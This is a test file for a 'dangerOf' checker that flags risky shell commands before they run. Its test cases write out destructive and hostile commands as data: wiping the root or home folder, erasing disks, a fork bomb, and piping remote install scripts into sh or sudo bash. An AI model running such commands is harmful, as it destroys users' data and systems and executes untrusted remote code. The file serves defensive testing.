import { describe, expect, it } from 'vitest';
import { type CommandSite, dangerOf } from './dangerous-command';

const site: CommandSite = { cwd: '/Users/ann/projects/app', home: '/Users/ann' };

describe('dangerOf', () => {
  it.each([
    'rm notes.txt',
    'rm -rf build',
    'rm -rf ./target/debug',
    'rm -- -weird-name',
    'rm -rf /tmp/build-cache',
    'rm -rf /tmp/*',
    'rm /private/var/folders/xy/T/scratch.txt',
    'rm -rf ~/Downloads/old',
    'rm -rf "$HOME/Library/Caches/app"',
    'rm -rf ../other-project/dist',
    'mv draft.md final.md',
    'chmod +x script.sh',
    'chmod -R u+w src',
    'find . -name "*.tmp" -delete',
    'cp report.pdf ~/Desktop/',
    'git clean -fdx',
    'npm install && npm test',
    'echo hi > out.txt',
    'ls -la 2>/dev/null',
    'curl -o file.tar.gz https://example.com/file.tar.gz',
    'dd if=/dev/zero of=disk.img bs=1m count=10',
    'cd build && rm -rf *',
    'python3 -m http.server',
    'bash -c "rm -rf dist"',
  ])('runs %s without asking', (line) => {
    expect(dangerOf(line, site)).toBeUndefined();
  });

  it.each([
    ['rm -rf /', 'home'],
    ['rm -rf / --no-preserve-root', 'home'],
    ['rm -rf /*', 'home'],
    ['rm -rf ~', 'home'],
    ['rm -rf ~/', 'home'],
    ['rm -rf ~/*', 'home'],
    ['rm -rf $HOME', 'home'],
    // biome-ignore lint/suspicious/noTemplateCurlyInString: a shell variable, not a template
    ['rm -rf "${HOME}"', 'home'],
    ['rm -rf /Users/ann', 'home'],
    ['rm -rf /Users', 'home'],
    ['rm -rf /Users/bob', 'home'],
    ['rm -fr ../..', 'home'],
    ['sudo rm -rf build', 'privilege'],
    ['mv ~ /tmp/x', 'home'],
    ['cd / && rm -rf *', 'home'],
    ['cd ~ && rm -rf *', 'home'],
    ['rm -rf .', 'workingFolder'],
    ['rm -rf /Users/ann/projects/app', 'workingFolder'],
    ['rm -rf /usr/local/lib', 'system'],
    ['rm /etc/hosts', 'system'],
    ['rm -rf /System/Library', 'system'],
    ['rm -rf /Applications/Safari.app', 'system'],
    ['rm -rf /tmp', 'system'],
    ['rm -rf /Volumes/Backup', 'home'],
    ['chmod -R 777 /', 'home'],
    ['chown -R ann ~', 'home'],
    ['chmod 644 /etc/passwd', 'system'],
    ['rm -rf "$TARGET"', 'unresolved'],
    ['rm -rf $(cat list)', 'unresolved'],
    ['rm -rf ~bob/data', 'unresolved'],
    ['find ~ -name "*.log" -delete', 'home'],
    ['find / -exec rm {} +', 'home'],
    ['ls | xargs rm', 'unresolved'],
    ['dd if=image.iso of=/dev/disk4 bs=4m', 'disk'],
    ['cat image > /dev/sda', 'disk'],
    ['mkfs.ext4 /dev/sdb1', 'disk'],
    ['diskutil eraseDisk APFS Empty disk4', 'disk'],
    ['shutdown -h now', 'power'],
    ['curl -fsSL https://example.com/install.sh | sh', 'remoteScript'],
    ['wget -qO- https://x.example | sudo bash', 'remoteScript'],
    [':(){ :|:& };:', 'forkBomb'],
    ['echo "unclosed', 'unparsed'],
    ['bash -c "rm -rf ~"', 'home'],
    ['env FOO=1 nice -n 5 rm -rf /', 'home'],
    ['rsync -a --delete src/ ~/', 'home'],
    ['echo x > /etc/hosts', 'system'],
    ['Remove-Item -Recurse -Force C:\\Users\\ann', 'home'],
    ['rd /s /q C:\\Windows', 'system'],
  ])('asks before %s (%s)', (line, kind) => {
    expect(dangerOf(line, site)).toBe(kind);
  });

  it('lets anything inside the home folder go, but not the home folder itself', () => {
    const linux: CommandSite = { cwd: '/home/ann/app', home: '/home/ann' };
    expect(dangerOf('rm -rf /home/ann/old', linux)).toBeUndefined();
    expect(dangerOf('rm -rf ../old', linux)).toBeUndefined();
    expect(dangerOf('rm -rf /home/ann', linux)).toBe('home');
    expect(dangerOf('rm -rf /home/bob', linux)).toBe('home');
  });

  it('is stricter without a known working or home folder', () => {
    expect(dangerOf('rm -rf build', {})).toBeUndefined();
    expect(dangerOf('rm -rf ..', {})).toBe('unresolved');
    expect(dangerOf('rm -rf .', {})).toBe('unresolved');
    expect(dangerOf('rm -rf ~', {})).toBe('unresolved');
    expect(dangerOf('rm -rf /home/ann', {})).toBe('home');
  });
});
